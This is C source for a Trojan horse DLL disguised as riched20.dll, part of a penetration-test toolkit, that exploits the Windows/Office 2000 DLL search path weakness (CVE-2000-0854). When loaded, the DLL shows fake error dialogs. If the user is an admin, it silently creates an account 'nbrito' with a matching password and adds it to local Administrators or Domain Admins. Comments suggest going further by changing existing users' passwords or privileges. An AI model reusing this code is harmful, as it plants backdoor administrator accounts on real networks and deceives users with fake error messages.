/* XXX - PRIVATE CODE - XXX
 * 
 * Copyrightï¿½ 2000-2008 Nelson Brito.
 * This file is part of Penetration Test Toolkit by Nelson Brito.

   License, Distribution and Warranty:
   (1) This code is *CONFIDENCIAL, PROPRIETARY and PROTECTED*  from disclosure. 
       Needs to be notified  to Nelson Brito, in the case of this code is being 
       distributed or published in any way.
 
   (2) You *DO NOT* have permission to use this code in a commercial product or 
       commercial consulting.
	  
   (3) This code is provided as open source but *IS NOT LICENSED* under the GPL
       or other common open source licenses. This code *MAY NOT BE* re-licensed
	   without the explicit, written permission of Nelson Brito.

   (4) This software is provided AS-IS with no warranty expressed or implied.
   
   (5) The Copyright holder *IS NOT* liable for any costs associated with using
       this software.

   (6) This code, or portions of it, *MAY NOT BE* incorporated into other codes
       without the explicit, written permission of Nelson Brito.

 * XXX - PRIVATE CODE - XXX */
#ifndef __RICHED20_CPP
#define __RICHED20_CPP 1

#ifndef UNICODE 
#define UNICODE 1
#endif  /* UNICODE */

/* Author:    Nelson Brito <nbrito@sekure.org>
   Revisions: December 9rh, 2000
			  February 13rd, 2001
			  April 6th, 2001
			  October 14th, 2008 */
#include <stdio.h> 
#include <windows.h> 
#include <wchar.h> 
#include <lmaccess.h> 
#include <lm.h> 
#include <winbase.h> 

/* XXX - FURTHER INFORMATION - XXX
 * 
 * Title:		Microsoft Windows DLL Search Path Weakness
 * Bugtraq ID:	1699
   CVE:			 CVE-2000-0854
   Microsoft:	UNASSIGNED
   X-Force:		office-dll-execution(5263)


[References]
   This vulnerability was discovered by Georgi Guninski <guninski@guninski.com>.

   Some interesting URLs:
   http://www.guninski.com/dll1.cpp
   http://www.guninski.com/officedll.html
   http://www.securityfocus.com/bid/1699
   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0854
   http://xforce.iss.net/xforce/xfdb/5263


[Vulnerability details]
   When a Microsoft Office 2000 document is launched, the current directory of
   that document is first used to locate DLL's such as:
    - riched20.dll; and
	- msi.dll
	
   This vulnerability could allow an attacker to execute arbitrary commands by
   inserting a Trojan Horse DLL into the same directory as the document.

 * XXX - FURTHER INFORMATION - XXX */
#pragma hdrstop 
#pragma comment(lib, "netapi32") 

/* Routine to find the Primary DC server's name in the Network.
   Returns the PDC Server Name or NULL if there is no Primary DC. */
LPWSTR FindPrimaryDC(LPWSTR L_MACHINE){ 
	NET_API_STATUS NAPIS;
	LPBYTE PRIMARY_DC, F_STAT;

	NAPIS = NetGetDCName(L_MACHINE, NULL, &PRIMARY_DC); 

	if(NAPIS != NERR_Success || PRIMARY_DC == NULL) 
		return(NULL);

	F_STAT = PRIMARY_DC;

	NetApiBufferFree(PRIMARY_DC);

	return((LPWSTR)F_STAT); 
}

/* Routine to verify if the current user is member of Administrators Group.
   Returns TRUE or FALSE. */ 
BOOL CurrUserAdminStatus(wchar_t * U_NAME, wchar_t * PRIMARY_DC){ 
	BOOL F_STAT; 
	USER_INFO_1 *UI; 

	if(NetUserGetInfo(PRIMARY_DC, U_NAME, 1, (BYTE **) &UI) != NERR_Success) 
		return(FALSE); 

	if(UI->usri1_priv == USER_PRIV_ADMIN)
		F_STAT = TRUE;
	else
		F_STAT = FALSE;

	NetApiBufferFree(UI);

	return(F_STAT);
}

/* Main DLL routine. */
BOOL APIENTRY DllMain(HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved){
	wchar_t			U_NAME[256];
	LPWSTR			PRIMARY_DC;
	DWORD			SZ_U_NAME	= sizeof(U_NAME);
	/* The USER_INFO_1 structure specifies information about an user account.
	   It could be much more specific using structures like: USER_INFO_22. */
	USER_INFO_1     UI;
	NET_API_STATUS	N_STAT		= 0;
	LPWSTR			NBRITO		= TEXT("nbrito");
	DWORD			USER_LEVEL	= 1;
	DWORD			PARM_ERR	= 0;
	DWORD			GROUP_LEVEL	= 3;
	DWORD			TOTAL_ENT	= 1;

	/* Setting the information for user account "nbrito". */
	UI.usri1_name				= NBRITO;
	UI.usri1_password			= NBRITO;
	/* "For the NetUserAdd function, this member must be USER_PRIV_USER." */
	UI.usri1_priv				= USER_PRIV_USER;
	UI.usri1_home_dir			= NULL;
	UI.usri1_comment			= TEXT("Nelson Brito");
	UI.usri1_flags				= UF_SCRIPT;
	UI.usri1_script_path		= NULL;

	switch(ul_reason_for_call){ 
		case DLL_PROCESS_ATTACH:
			/* Find a Primary DC in the network. */
			PRIMARY_DC = FindPrimaryDC(NULL);
			/* Find the current user name. */
			GetUserNameW(U_NAME, &SZ_U_NAME);

			switch(CurrUserAdminStatus(U_NAME, (LPWSTR)PRIMARY_DC)){
				/* Tests if the current user name has administrator's privilege. */
				case TRUE:
					MessageBox(NULL, TEXT("Error trying to open a file. Invalid memory access @ 0xdeadbeef."), TEXT("Warning!"), MB_OK|MB_SETFOREGROUND|MB_ICONSTOP);

					/* Just add the user account on the server.But it can be more sophisticated, such as:
					   - If the user already exists, the privileges can be changed to escalate;
					   - If the user already exists, the password can be changed;
					   - Etc... */
					N_STAT = NetUserAdd(PRIMARY_DC, USER_LEVEL, (LPBYTE)&UI, &PARM_ERR);

					if(N_STAT != NERR_Success)
						exit(FALSE);

					/* Testing if there is a Primary DC server.
					
					   XXX Here is some gotchas XXX
					   (1) If the FindPrimaryDC() returns NULL it means that there is no Primary
					       DC in the network, and the user can only be added to Administrators.

					   (2) If the FindPrimaryDC() returns any value it means that there is a PDC
					       in the network, and the user can be added to Domain Admins. */

					/* Case (1) - Stand-alone Server. */
					if(PRIMARY_DC == NULL){

						N_STAT = NetLocalGroupAddMembers(PRIMARY_DC, TEXT("Administrators"), GROUP_LEVEL, (LPBYTE)&UI, TOTAL_ENT);

						if(N_STAT != NERR_Success)
							exit(FALSE);

					/* Case (2) - Primary Domain Controller Server. */
					} else {

						N_STAT = NetGroupAddUser(PRIMARY_DC, TEXT("Domain Admins"), NBRITO);

						if(N_STAT != NERR_Success)
							exit(FALSE);

					}
					break; 

				case FALSE: 
					MessageBox(NULL, TEXT("Error trying to open a corrupted file, please report this error message to your Administrator"), TEXT("Error!"), MB_OK|MB_SETFOREGROUND|MB_ICONSTOP);
					break; 

			}
			break;

		case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }

    return(TRUE);
}
#endif  /* __RICHED20_CPP */
